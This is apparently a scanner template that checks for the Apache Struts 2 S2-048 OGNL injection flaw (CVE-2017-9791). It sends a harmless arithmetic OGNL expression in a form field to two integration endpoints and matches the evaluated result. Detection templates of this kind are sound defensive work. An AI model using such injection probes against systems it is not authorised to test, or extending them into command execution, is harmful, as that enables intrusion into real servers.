id: local-struts2-s2-048-math

info:
  name: Struts2 S2-048 OGNL Injection via Struts1 Integration (CVE-2017-9791)
  author: pentest-platform
  severity: critical
  description: |
    Apache Struts 2 S2-048 (CVE-2017-9791) OGNL injection via Struts1 Integration Plugin.
    Safe math probe: ${233*233} evaluates to 54289 in the gangster name response.
  reference:
    - https://struts.apache.org/docs/s2-048.html
    - https://nvd.nist.gov/vuln/detail/CVE-2017-9791
  tags: safe-poc,struts2,s2-048,cve,cve2017,ognl,rce

http:
  - method: POST
    path:
      - "{{BaseURL}}/integration/saveGangster.action"
      - "{{BaseURL}}/showcase/integration/saveGangster.action"
    body: "name=${233*233}&age=1&description=test"
    stop-at-first-match: true
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "54289"
      - type: status
        status:
          - 200
